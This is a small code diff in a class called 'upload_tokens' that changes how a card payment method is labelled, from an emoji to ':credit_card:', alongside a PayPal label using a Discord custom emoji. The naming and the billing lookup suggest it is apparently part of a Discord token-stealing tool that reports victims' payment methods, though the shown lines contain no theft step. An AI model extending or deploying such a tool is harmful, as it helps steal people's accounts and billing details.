@@ -255,7 +255,7 @@ class upload_tokens:
 
                 for method in billing:
                     if method['type'] == 1:
-                        payment_methods.append('💳')
+                        payment_methods.append(':credit_card:')
 
                     elif method['type'] == 2:
                         payment_methods.append("<:paypal:973417655627288666>")
